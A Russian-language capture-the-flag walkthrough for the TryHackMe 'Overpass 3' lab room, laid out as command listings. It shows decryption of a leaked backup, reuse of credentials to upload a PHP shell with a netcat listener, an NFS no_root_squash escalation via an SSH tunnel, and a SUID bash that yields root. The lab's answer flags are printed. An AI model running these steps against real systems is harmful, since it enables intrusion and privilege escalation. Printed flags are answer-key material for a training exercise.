[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Overpass 3 - Hosting](https://tryhackme.com/r/room/overpass3hosting) 

Всего 1 заданиe:
## Задание 1
После неудачного старта Overpass в сфере информационной безопасности, коммерческого провала их менеджера паролей и 
последующего взлома они решили попробовать себя в новом бизнесе.

Overpass стал компанией веб-хостинга!
К сожалению, они не извлекли уроков из своих прошлых ошибок. Ходят слухи, что их главный веб-сервер крайне уязвим.

Предупреждение: Загрузка этого ящика может занять около 5 минут, если вы не являетесь подписчиком. Как подписчик, 
он будет готов гораздо быстрее.

Я буду просматривать записи для этой комнаты, начиная с 1 недели после выпуска. До этого времени, пожалуйста, не 
публикуйте записи. Хранить их в нераспечатанном виде — это нормально, но, пожалуйста, не делитесь ими.

Вы можете транслировать эту комнату, как только статьи будут одобрены.
Изображение баннера от  Nastuh Abootalebi на Unsplash

### Ответьте на вопросы ниже
Веб-флаг
```commandline
nmap -sSCV <IP>
gobuster dir -u http://<IP> -x php,txt,old,bak,tar,zip -w /usr/share/wordlists/dirb/common.txt
wget http://<IP>/backups/backup.zip
unzip backup.zip
gpg --import priv.key
gpg --decrypt-file CustomerDetails.xlsx.gpg 
ll
# CustomerDetails.xlsx
# paradox:ShibesAreGreat123
# 0day:OllieIsTheBestDog
# muirlandoracle:A11D0gsAreAw3s0me

ftp <IP>
paradox:ShibesAreGreat123
ls -la
put shell.php
nc -nlvp 4444
curl -s http://<IP>/shell.php
find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
cat /usr/share/httpd/web.flag
```
```commandline
thm{0ae72f7870c3687129f7a824194be09d}
```
Пользовательский флаг
```commandline
ls -la /home
sudo -l
find / -type f -user james -exec ls -l {} + 2>/dev/null
rpcinfo -p | grep nfs
mkdir nfs
sudo mount -t nfs <IP>:/home/james nfs
sshpass -p "ShibesAreGreat123" ssh paradox@<IP> -L 2049:127.0.0.1:2049
nmap -p 2049 -sC -sV 127.0.0.1
sudo mount -t nfs 127.0.0.1: nfs
cd nfs
ll
cat user.flag
```
```commandline
thm{3693fc86661faa21f16ac9508a43e1ae}
```
Корневой флаг
```commandline
ls -la
cp ~/.ssh/id_rsa.pub .ssh/authorized_keys
ssh james@<IP>
cp /usr/bin/bash /home/james/
sudo chown root:root bash
sudo chmod +s bash
ll
./bash -p
cat /root/root.flag
```
```commandline
thm{a4f6adb70371a4bceb32988417456c44}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)